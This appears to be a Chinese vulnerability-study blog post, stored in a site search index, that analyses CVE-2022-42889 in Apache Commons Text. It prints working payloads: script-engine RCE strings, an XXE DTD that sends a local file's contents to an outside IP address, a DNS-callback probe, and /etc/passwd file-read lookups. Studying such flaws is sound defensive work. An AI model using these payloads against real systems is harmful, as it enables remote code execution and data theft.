<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Commons Text RCE 漏洞学习 CVE-2022-42889</title>
    <url>/2022/11/25/blog_Apache%20Commons%20Text_CVE-2022-42889/</url>
    <content><![CDATA[<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a><strong>利用范围</strong></h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.5 &lt;= Apache Commons Text &lt;= 1.9</span><br></pre></td></tr></table></figure></div>

<p>pom.xml如下：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-text<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>入口处是调用 StringSubstitutor#replace ，传入的参数为POC</p>
<p>紧接着调用 StringSubstitutor#substitute ，再调用StringSubstitutor.Result#substitute 。</p>
<p>这里有做一系列处理，但是大致流程就是把 ${ 和 } 中间的东西提取出来并最终赋值给 varName。（处理方式也和log4j2很像，代码格式也是，给我感觉基本上是照搬的）</p>
<p>最终到达下面这一步比较关键的代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230130152955290.png"
                      alt="image-20230130152955290"
                ></p>
<p>调用 StringSubstitutor#resolveVariable ，resolver一定可以拿到StringLookup实例，调用</p>
<p>InterpolatorStringLookup#lookup</p>
<p>和log4j2差不多，我们先去看 StringSubstitutor.class 的 resolveVariable，其中获取了variableResolver。该属性值中含有一个map属性的内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230130152428163.png"
                      alt="image-20230130152428163"
                ></p>
<p>后续也会根据这个map的键值去获取对应类。</p>
<p>InterpolatorStringLookup.class 下的 lookup 方法非常眼熟</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(<span class="number">58</span>);</span><br><span class="line">        <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> toKey(<span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos));</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">            <span class="type">StringLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> (StringLookup)<span class="built_in">this</span>.stringLookupMap.get(prefix);</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">                value = lookup.lookup(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defaultStringLookup != <span class="literal">null</span> ? <span class="built_in">this</span>.defaultStringLookup.lookup(<span class="keyword">var</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据冒号<code>:</code> 来获取前缀。获取前缀通过map get一个类。如果获取内容不为空，就会跟着进行对应的lookup方法。后续就看各种lookup各有什么作用即可。</p>
<h2 id="ScriptStringLookup"><a href="#ScriptStringLookup" class="headerlink" title="ScriptStringLookup"></a><strong>ScriptStringLookup</strong></h2><p>该方法实现了通过 ScriptEngine类的 js 代码执行。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] keys = key.split(SPLIT_STR, <span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">keyLen</span> <span class="operator">=</span> keys.length;</span><br><span class="line">            <span class="keyword">if</span> (keyLen != <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> IllegalArgumentExceptions.format(<span class="string">&quot;Bad script key format [%s]; expected format is EngineName:Script.&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;key&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">engineName</span> <span class="operator">=</span> keys[<span class="number">0</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> keys[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>()).getEngineByName(engineName);</span><br><span class="line">                    <span class="keyword">if</span> (scriptEngine == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No script engine named &quot;</span> + engineName);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> Objects.toString(scriptEngine.eval(script), (String)<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> IllegalArgumentExceptions.format(var7, <span class="string">&quot;Error in script engine [%s] evaluating script [%s].&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;engineName, script&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>代码内容相当清晰，根据 <code>:</code> 获取 engineName 和 script，冒号前面内容为engineName，而后面内容为 script。</p>
<p>然后用engineName来获取脚本引擎加载 script 内容。</p>
<p>payload就显而易见了。。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;script:js:<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;calc&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ScriptException &#123;</span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line"><span class="comment">//        String payload = interpolator.replace(&quot;$&#123;script:js:new java.lang.ProcessBuilder(\&quot;calc\&quot;).start()&#125;&quot;);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;script:js:new java.lang.ProcessBuilder(\&quot;calc\&quot;).start()&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;$&#123;script:js:java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&#125;&quot;</span>;</span><br><span class="line">        interpolator.replace(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="XmlStringLookup"><a href="#XmlStringLookup" class="headerlink" title="XmlStringLookup"></a><strong>XmlStringLookup</strong></h2><p>lookup方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] keys = key.split(SPLIT_STR);</span><br><span class="line">            <span class="type">int</span> <span class="variable">keyLen</span> <span class="operator">=</span> keys.length;</span><br><span class="line">            <span class="keyword">if</span> (keyLen != <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> IllegalArgumentExceptions.format(<span class="string">&quot;Bad XML key format [%s]; expected format is DocumentPath:XPath.&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;key&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">documentPath</span> <span class="operator">=</span> keys[<span class="number">0</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">xpath</span> <span class="operator">=</span> StringUtils.substringAfter(key, <span class="number">58</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Files.newInputStream(Paths.get(documentPath));</span><br><span class="line">                    <span class="type">Throwable</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                    String var8;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var8 = XPathFactory.newInstance().newXPath().evaluate(xpath, <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                        var7 = var18;</span><br><span class="line">                        <span class="keyword">throw</span> var18;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    inputStream.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                                    var7.addSuppressed(var17);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                inputStream.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var8;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> IllegalArgumentExceptions.format(var20, <span class="string">&quot;Error looking up XML document [%s] and XPath [%s].&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;documentPath, xpath&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>：</code> 将内容分成两部分</p>
<p>前者为documentPath，后者为xpath，接着有</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Files.newInputStream(Paths.get(documentPath));</span><br><span class="line">....</span><br><span class="line">var8 = XPathFactory.newInstance().newXPath().evaluate(xpath, <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream));</span><br></pre></td></tr></table></figure></div>

<p>说明通过 documentPath 去获取了一个文件的输入流</p>
<p>接着 <code>com.sun.org.apache.xpath.internal.jaxp.XPathImpl#evaluate</code> 调用XML文件，实现XXE。</p>
<p>假定我们通过某种方式上传了 test.xml 文件，其内容为：</p>
<p><strong>test.xml</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">        &lt;!ENTITY % dtd SYSTEM &quot;http://49.232.29.145:2740/winkoishi.dtd&quot;&gt;%dtd;%send;</span><br><span class="line">        ]&gt;</span><br></pre></td></tr></table></figure></div>

<p>在公网放置</p>
<p><strong>winkoishi.dtd</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///R:\a\hello.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://49.232.29.145:2740/?f=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%payload;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure></div>

<p>R:\a\hello.txt 为我本地R盘下放置的文件。</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XmlStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ScriptException &#123;</span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;xml:test.xml:test&#125;&quot;</span>;</span><br><span class="line">        interpolator.replace(payload);</span><br><span class="line">        <span class="comment">//org.apache.commons.text.lookup.XmlStringLookup</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后成功获取我们需要的内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230130160759883.png"
                      alt="image-20230130160759883"
                ></p>
<h2 id="DnsStringLookup"><a href="#DnsStringLookup" class="headerlink" title="DnsStringLookup"></a><strong>DnsStringLookup</strong></h2><p><strong>lookup</strong></p>
<p>通过 | 分割 key，主要起到一个 dns 请求的作用，可用作漏洞探测，其中 subValue 填入 URL 即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] keys = key.trim().split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">keyLen</span> <span class="operator">=</span> keys.length;</span><br><span class="line">            <span class="type">String</span> <span class="variable">subKey</span> <span class="operator">=</span> keys[<span class="number">0</span>].trim();</span><br><span class="line">            <span class="type">String</span> <span class="variable">subValue</span> <span class="operator">=</span> keyLen &lt; <span class="number">2</span> ? key : keys[<span class="number">1</span>].trim();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InetAddress</span> <span class="variable">inetAddress</span> <span class="operator">=</span> InetAddress.getByName(subValue);</span><br><span class="line">                <span class="type">byte</span> <span class="variable">var8</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">switch</span>(subKey.hashCode()) &#123;</span><br><span class="line">                <span class="keyword">case</span> -<span class="number">1147692044</span>:</span><br><span class="line">                    <span class="keyword">if</span> (subKey.equals(<span class="string">&quot;address&quot;</span>)) &#123;</span><br><span class="line">                        var8 = <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3373707</span>:</span><br><span class="line">                    <span class="keyword">if</span> (subKey.equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                        var8 = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1339224004</span>:</span><br><span class="line">                    <span class="keyword">if</span> (subKey.equals(<span class="string">&quot;canonical-name&quot;</span>)) &#123;</span><br><span class="line">                        var8 = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(var8) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> inetAddress.getHostName();</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> inetAddress.getCanonicalHostName();</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">return</span> inetAddress.getHostAddress();</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> inetAddress.getHostAddress();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException var9) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>大致内容就是通过 | 分割 key，当内容为address时，起到一个 dns 请求的作用，可用作漏洞探测，其中 subValue 填入 URL 即可</p>
<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DnsStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;dns:address|jq4fkj.dnslog.cn&#125;&quot;</span>;</span><br><span class="line">        interpolator.replace(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="循环调用"><a href="#循环调用" class="headerlink" title="循环调用"></a><strong>循环调用</strong></h2><p>至于下面两个 Lookup 相对来讲就比较鸡肋，介绍的原因主要是所有的 Lookup 都会去返回一个值，赋值给 varValue。在 varValue 不为空的情况下返回的值将会再次调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String varValue = this.resolveVariable(varName, builder, startPos, pos);</span><br><span class="line">                                        if (varValue == null) &#123;</span><br><span class="line">                                            varValue = varDefaultValue;</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                        if (varValue != null) &#123;</span><br><span class="line">                                            varLen = varValue.length();</span><br><span class="line">                                            builder.replace(startPos, pos, varValue);</span><br><span class="line">                                            altered = true;</span><br><span class="line">                                            change = 0;</span><br><span class="line">                                            if (!substitutionInValuesDisabled) &#123;</span><br><span class="line">                                                change = this.substitute(builder, startPos, varLen, (List)priorVariables).lengthChange;</span><br><span class="line">                                            &#125;</span><br></pre></td></tr></table></figure></div>

<p>那如果返回的还是一个符合条件的表达式，那么就可以继续调用 lookup。</p>
<h2 id="FileStringLookup"><a href="#FileStringLookup" class="headerlink" title="FileStringLookup"></a><strong>FileStringLookup</strong></h2><p><strong>lookup</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] keys = key.split(String.valueOf(<span class="string">&#x27;:&#x27;</span>));</span><br><span class="line">            <span class="type">int</span> <span class="variable">keyLen</span> <span class="operator">=</span> keys.length;</span><br><span class="line">            <span class="keyword">if</span> (keyLen &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> IllegalArgumentExceptions.format(<span class="string">&quot;Bad file key format [%s], expected format is CharsetName:DocumentPath.&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;key&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> keys[<span class="number">0</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> StringUtils.substringAfter(key, <span class="number">58</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(fileName)), charsetName);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> IllegalArgumentExceptions.format(var7, <span class="string">&quot;Error looking up file [%s] with charset [%s].&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;fileName, charsetName&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>测试poc</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;file:utf-8:/etc/passwd&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>通过 : 拆分 key 为两部分，第一部分赋值给 charsetName，第二部分赋值给 fifileName</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> keys[<span class="number">0</span>];</span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> StringUtils.substringAfter(key, <span class="number">58</span>);</span><br></pre></td></tr></table></figure></div>

<p>最后做了一个文件的读取并以 return 返回赋值给 varValue</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(fileName)), charsetName);</span><br></pre></td></tr></table></figure></div>

<p>想要实现任意文件读取，就必须要将返回值赋值给一个变量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String res = stringSubstitutorInterpolator.replace(payload);</span><br></pre></td></tr></table></figure></div>

<p>如果 StringSubstitutor.disableSubstitutionInValues 这个变量为 false 的话，可以进行循环调用，也就是我们在要读取的文件的文件中写入其它POC，例如hello.txt写入script攻击</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;script:js:new java.lang.ProcessBuilder(&quot;calc&quot;).start()&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么使用 ${file:utf-8:hello.txt} 最终会执行RCE，可以算是一种绕过方式；如果写入相同的payload会爆无限循环异常。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230130170757820.png"
                      alt="image-20230130170757820"
                ></p>
<p>但是还是需要想办法找到上传文件。</p>
<h3 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileStringLookup_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;file:utf-8:hello.txt&#125;&quot;</span>;</span><br><span class="line">        # 要看见文件内容，需要将返回值赋值给一个变量</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> interpolator.replace(payload);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="UrlStringLookup（我感觉还挺好用的？）"><a href="#UrlStringLookup（我感觉还挺好用的？）" class="headerlink" title="UrlStringLookup（我感觉还挺好用的？）"></a><strong>UrlStringLookup（我感觉还挺好用的？）</strong></h2><p><strong>测试poc</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;url:utf-8:file:///etc/passwd&#125;</span><br><span class="line">$&#123;url:utf-8:http://127.0.0.1:8888/double.txt&#125;</span><br></pre></td></tr></table></figure></div>

<p>顾名思义，就是可以通过 http，fifile等协议去访问，然后把获得的值返回给 varValue。同理，想要实现任意文件读取，就必须要将返回值赋值给一个变量。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> stringSubstitutorInterpolator.replace(payload);</span><br></pre></td></tr></table></figure></div>

